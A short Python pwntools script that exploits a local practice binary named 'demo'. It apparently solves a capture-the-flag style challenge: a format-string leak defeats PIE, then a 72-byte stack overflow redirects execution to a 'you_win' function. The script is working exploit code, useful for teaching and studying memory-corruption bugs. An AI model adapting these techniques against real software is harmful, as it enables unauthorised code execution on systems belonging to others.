#!/usr/bin/env python3

from pwn import *

p = process("./demo")
#context.terminal = ["xfce4-terminal", '-e']
#gdb.attach(p)
binary = ELF("./demo")

p.sendline(b"%20$p")
p.recvuntil(b"Hello!")

leak = int(p.recvline()[:-1], 16)
log.success("PIE leak : %s" % hex(leak))

rip_offset = 72
rip_padding = b"A" * rip_offset

base = leak - binary.symbols["main"]
binary.address = base

payload = rip_padding
payload += p64(binary.symbols["you_win"])

p.sendline(payload)
p.interactive()

